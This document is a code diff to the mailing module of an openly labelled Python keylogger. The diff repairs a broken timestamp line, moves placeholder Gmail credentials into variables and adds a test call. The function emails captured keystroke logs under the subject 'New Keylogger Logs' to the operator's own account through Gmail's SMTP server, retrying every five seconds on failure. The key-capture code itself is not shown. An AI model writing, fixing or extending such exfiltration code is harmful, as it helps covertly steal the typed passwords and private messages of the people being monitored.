@@ -1,10 +1,12 @@
 import smtplib
 import time
 
-def SendMessages(strLogs):
+strEmailAc = "email@gmail.com"
+strEmailPass = "pass"
+
+def SendMessages(strLogs, strEmailAc, strEmailPass):
     try:
-        strDateTime = "Keylogger Started At: "  + strDateTime = time.strftime("%d/%m/%Y") +
-                    "\t" + time.strftime("%I:%M:%S")
+        strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
         strMessage = strDateTime + "\n\n" + strLogs
 
         strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)
@@ -12,8 +14,12 @@ def SendMessages(strLogs):
 
         SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
         SmtpServer.ehlo()   # identifies you to the smtp server
-        SmtpServer.login("YOURGMAILADDRESS", "YOURGMAILPASSWORD")
-        SmtpServer.sendmail("YOURGMAILADDRESS", "YOURGMAILADDRESS", strMessage)
+        SmtpServer.login(strEmailAc, strEmailPass)
+        SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
     except:
         time.sleep(5)   # freeze program for 5 seconds to try again
-        SendMessages(strLogs)
+        SendMessages(strLogs, strEmailAc, strEmailPass)
+
+
+strLogs = "aaaaaa"
+SendMessages(strLogs, strEmailAc, strEmailPass)
